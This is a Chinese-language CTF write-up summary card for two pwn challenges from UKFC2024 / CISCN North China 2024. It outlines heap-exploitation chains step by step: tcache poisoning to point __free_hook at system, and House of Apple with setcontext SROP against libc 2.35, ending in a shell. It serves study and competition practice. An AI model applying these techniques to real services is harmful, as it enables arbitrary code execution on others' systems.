---
title: "UKFC2024 CISCN 华北赛区 pwn 方向 WP"
category: pwn
tags: ["UKFC2024 / CISCN 华北", "pwn", "book-manager", "tcache-poisoning", "free-hook-system", "protobuf"]
signals: ["UKFC2024 / CISCN 华北 2024", "book-manager", "tcache-poisoning", "free-hook-system", "protobuf", "house-of-apple", "setcontext-srop", "largebin-attack", "esoteric", "UKFC2024", "CISCN", "pwn", "book", "tcache"]
difficulty: medium
source: "https://www.ctfiot.com/191289.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# UKFC2024 CISCN 华北赛区 pwn 方向 WP

> 赛事：UKFC2024 / CISCN 华北 2024 | 方向：pwn | 难度：medium

## 一句话总结

UKFC2024 CISCN 华北 pwn 2 题：book tcache poisoning + proc Protobuf 序列化 House of Apple SROP。

## 攻击链

1. book: 4 菜单 (add/show/edit/delete) 经典堆题
2. add(0x4f8, 'a') + add(0x38, 'b') + add(0x4f8, 'c') + add(0x38, '/bin/sh')
3. delete(0); edit(1, 'a'*0x30 + p64(0x540)) 制造 fake size
4. delete(2) 触发 unsorted bin 残余
5. add(0x4f8, 'a'); show(1) 泄 libc → __free_hook = system
6. add(4, 0x38, 'd'); delete(4) 触发 tcache 残余
7. edit(1, p64(leak + __free_hook)); add(5, 0x38, 'aa'); add(6, 0x38, p64(system))
8. free 触发 system('/bin/sh')
9. proc: Protobuf 序列化 msg { content, idx, size }
10. 5 菜单 (add/show/edit/delete/exit) 走 Protobuf 协议
11. add(0x540, 'aaa') + add(0x530, 'bbb') → unsorted bin 泄 libc
12. setcontext+61 + _IO_wfile_jumps 链 House of Apple
13. edit(0, 0x1f, p64(0)*3 + p64(io_all-0x20)) 改 _IO_list_all
14. delete(7) 触发 exit flush → 调 _IO_wfile_overflow → SROP
15. 0xe3b01 one_gadget 弹 shell

## 关键 payload

```
tcache poisoning __free_hook = system
```

## 经验教训

Protobuf 序列化通信的程序，size 字段是 sint64/2 实际大小；House of Apple 配合 setcontext+61 是 libc-2.35 主流打法。

## 标签

book-manager、tcache-poisoning、free-hook-system、protobuf、house-of-apple、setcontext-srop、largebin-attack

## 参考来源

- https://www.ctfiot.com/191289.html
- 原文件：UKFC2024_CISCN华北赛区pwn方向WP.full.md
